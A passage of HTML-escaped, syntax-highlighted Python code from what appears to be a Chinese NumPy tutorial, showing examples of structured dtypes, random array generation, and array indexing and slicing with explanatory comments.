keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;数据类型为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dtype&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;df&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-13&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;itemz &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;array&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;tomatoes&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4.14&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;cabbages&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1.72&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                 dtype&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;df&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;自定义数据为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; itemz&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-14&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;生成的随机数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-15&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;生成的随机数组为：\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rand&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-16&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;生成的随机数组为：\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;randn&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-17&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;生成的随机数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;randint&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; size&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-18&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;arange&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 用整数作为下标可以获取数组中的某个元素&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 用范围作为下标获取数组的一个切片，包括 arr [3] 不包括 arr [5]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;80&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;81&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 省略开始下标，表示从 arr [0] 开始&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;82&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 下标可以使用负数，-1 表示从数组后往前数的第一个元素&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;83&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;84&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;85&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;101&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;86&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 下标还可以用来修改元素的值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;87&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 范围中的第三个参数表示步长，2 表示隔一个元素取一个元素&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;88&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;89&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 步长为负数时，开始下标必须大于结束下标&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;90&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;91&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-19&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;92&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; np&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;array&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;93&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;创建的二维数组为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;94&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 索引第 0 行中第 3 和第 4 列的元素&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;95&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 索引第 2 和第 3 行中第 3 列、第 4 列和第 5 列的元素&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;96&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;97&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 索引第 2 列的元素&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;98&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;99&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 代码 2-20&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;100&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 从两个序列的对应位置取出两个整数组成下标：arr [0,1], arr [1,2], arr [2,3]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;101&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;索引结果为：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;102&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token 